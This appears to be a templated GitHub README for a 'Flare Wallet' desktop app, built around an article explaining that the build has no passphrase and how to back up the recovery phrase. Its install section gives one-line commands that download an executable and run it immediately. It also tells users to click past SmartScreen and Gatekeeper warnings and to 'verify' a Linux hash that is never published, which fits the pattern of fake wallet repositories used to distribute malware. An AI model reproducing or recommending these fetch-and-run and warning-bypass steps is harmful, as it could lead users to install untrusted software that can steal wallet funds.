![Flare Wallet](assets/banner-article.png)

# Flare Wallet Passphrase: Why This Build Has No 25th Word

A feature other wallets offer, what it protects, and why its absence changes your backup plan.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

The build this page describes is the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02); no other version adds a passphrase field.

> There is no passphrase in this wallet. The recovery phrase is the entire secret, so writing it down correctly is the whole backup.

A passphrase, sometimes called the 25th word, is an optional extra secret that some wallets combine with the recovery phrase. This build does not have one. That is not a gap to work around: it changes what protects your wallet, and it changes what happens if your written phrase is ever found.

<!-- ARTICLE-BODY-BEGIN -->

## What a passphrase actually is

A recovery phrase is a fixed list of words that derives a wallet. A passphrase is a second secret, typed alongside those words, that changes what the words derive. The same twelve or twenty-four words with a different passphrase open a different wallet, with different addresses and usually no balance.

That design has one consequence worth stating before anything else: there is no way for a wallet to tell you that you typed the passphrase wrong. It opens an empty wallet and looks exactly like a wallet that was never used.

## Does this wallet have one?

No. The shipped build exposes no passphrase field, at creation or at restore, and the owner confirms the feature does not exist in it. You cannot set one, cannot add one later, and cannot be locked out by forgetting one.

The trade is symmetrical. Nothing here can be sealed behind a forgotten 25th word, and nothing here can hide a funded wallet behind the 24 words alone. Whatever protects the wallet is the secrecy of the phrase and the security of the machine.

## What protects the wallet instead

Three layers do the work a passphrase would have done, and each is worth knowing precisely because this build relies on them.

- **A local password.** The wallet file on disk is encrypted and unlocked with a password you set. It protects the file, not the phrase.
- **The recovery phrase, kept offline.** This is the real secret. Written on paper, stored away from the machine, never photographed or typed into a website.
- **The machine itself.** A disk-encrypted computer with a login you control, kept patched. If the laptop is stolen and the disk is not encrypted, the phrase in a text file or a screenshot is the loss.

A hardware signer is the fourth option and the strongest one for a large balance, because the phrase is entered on the device and never touches the computer. That path is set out in <a href="https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-ledger.md">Flare Wallet Ledger</a>.

## What a passphrase would have changed

Two things, and only two. It would have added a second secret to a written phrase that someone else finds, so the words alone would not open the funded wallet. And it would have allowed a decoy: the same words with a different passphrase opening a small wallet, with the real one behind the other passphrase.

Both are real protections and neither is available here. What the feature also brings is the failure mode people actually hit: a passphrase typed once with a typo, restored months later as a different wallet, with no error and no recovery. This build has no such trap, because it has no such field.

## If you are restoring a wallet that used a passphrase elsewhere

This matters more than it sounds. If your phrase was protected by a passphrase in another application, entering the words here derives the wallet that belongs to the words alone, which is a different address, usually empty.

Nothing is lost, and nothing is broken: the funded account still needs the passphrase, and it lives in whichever wallet supports it. Keep that wallet for that account and do not treat the empty result here as evidence that your phrase is wrong.

The general restore procedure, including the test that catches a transcription error, is in <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-backup.md">Flare Wallet backup and restore</a>. Run that test before moving funds, because a wallet that derives an address you do not recognise is a question to answer now rather than later.

## What a password is not

A wallet password and a passphrase are different things, and mixing them up is how people lose access. The password unlocks the encrypted file on this computer. The phrase rebuilds the wallet anywhere. Changing the password changes nothing about the addresses; losing the phrase changes everything.

So "I forgot my password" and "I lost my phrase" are different problems with different answers. The first is often survivable, since the file is only one copy. The second has no recovery at all, because no server holds a copy and no support desk can reset it.

## What to do instead of a passphrase

1. Write the phrase on paper, in order, and check every word against the screen before dismissing it.
2. Store it somewhere that fails independently of the machine, not in the same bag.
3. Restore from that paper once, while the wallet is empty, and confirm the address matches.
4. Turn on full-disk encryption and a login password on the computer.
5. For a balance that would hurt to lose, sign with a hardware device and keep the phrase off the computer entirely.

Steps one to three are the backup. Steps four and five are the substitute for the second secret this build does not offer. Install and reinstall only from the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a>, and what can be verified about that download, the licence and the release history is in <a href="https://github.com/flarewallet/flare-wallet-security/blob/HEAD/is-flare-wallet-safe.md">is Flare Wallet safe</a>.

## FAQ

### What is a passphrase in Flare Wallet Desktop?

It is not a feature of this build. A passphrase, where a wallet offers one, is an extra secret combined with the recovery phrase to derive a different wallet. This application exposes no such field, so the recovery phrase alone is what restores it.

### Does Flare Wallet support a 25th word?

No. There is no 25th-word field at creation or at restore, and the owner confirms the feature is absent rather than hidden behind an advanced setting.

### Can I add a passphrase to an existing wallet?

No. The wallet derives from the words alone, and this build gives you no way to attach a second secret. A different application that supports a passphrase would derive a different wallet from the same words.

### My old wallet used a passphrase. Can I restore it here?

You can restore the wallet that belongs to the words alone, which is a different address and usually empty. The passphrase-protected account stays in the wallet that supports the passphrase; keep both rather than replacing one with the other.

### Is my wallet less safe without a passphrase?

It is a different threat model, not automatically a weaker one. Without a second secret, the phrase is the whole defence, so its storage and the security of the computer carry all the weight. Disk encryption and a hardware signer close most of the gap.

### What is the difference between the wallet password and a passphrase?

The password encrypts the wallet file on this computer. A passphrase would change which wallet the recovery phrase derives. Only the phrase rebuilds the wallet elsewhere, which is why losing it cannot be undone by any password.

### What happens if someone finds my written recovery phrase?

They can restore the wallet and move the funds, because no second secret stands in the way. That is the reason the paper lives away from the machine, is never photographed, and is never typed into anything except the wallet you installed yourself.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet backup and restore](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-backup.md) | [is Flare Wallet safe](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/is-flare-wallet-safe.md) | [Flare Wallet Ledger](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-ledger.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
